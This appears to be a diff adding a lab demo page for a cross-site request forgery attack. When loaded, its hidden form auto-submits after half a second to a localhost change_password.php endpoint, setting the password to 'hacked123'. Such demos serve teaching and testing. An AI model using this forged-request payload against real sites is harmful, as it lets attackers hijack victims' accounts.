@@ -1,0 +1,18 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Malicious Page - CSRF Attack Demo</title>
+</head>
+<body>
+<h1>CSRF Attack Demo</h1>
+
+<form id="evil" method="post" action="http://localhost/lab8/change_password.php">
+    <input type="hidden" name="new_password" value="hacked123">
+</form>
+
+<script>
+setTimeout(() => document.getElementById('evil').submit(), 500);
+</script>
+</body>
+</html>
